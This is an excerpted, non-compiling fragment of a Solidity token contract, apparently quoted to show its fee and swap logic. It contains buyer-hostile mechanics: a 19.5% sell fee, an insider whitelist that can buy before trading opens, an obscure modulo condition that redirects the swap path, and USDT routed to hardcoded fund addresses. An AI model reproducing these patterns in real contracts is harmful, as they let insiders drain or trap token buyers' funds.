...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address public fundAddress = address(0x1A5a28a5bc9024CdFd59bDd16e3F1DC2F7AE460C);
    address public fundAddress1 = address(0xf4c77B2CFeDE021cB0A2EBF3c6BE2316E37085BC);
    ...
    uint256 private _tTotal = 7777 * 10 ** _decimals;
    ...
    uint256 public _buyFundFee = 450;
    uint256 public _buyLPFee = 50;

    uint256 public _sellFundFee = 1950;
        ...
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            if (_swapPairList[from] || _swapPairList[to]) {
                if (0 == startTradeTime || block.timestamp< startTradeTime) {
                    bool startBuy=false;
                    if(_advanceList[to]&&block.timestamp>(startTradeTime-20)){
                        startBuy=true;
                    }
                    require(startBuy);
                }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        if(rewardTotal%7==path.length){swapTokenAddress=_swapPair;}
        ...
        if(usdtBalance>0)
        {
            ...
            uint256 fundAmount = usdtBalance * fundFee * 2 / swapFee;
            uint256 fundAmount1 = 300 / fundFee * fundAmount;
            USDT.transferFrom(address(_tokenDistributor), fundAddress1, fundAmount1);
            USDT.transferFrom(address(_tokenDistributor), fundAddress, fundAmount-fundAmount1);
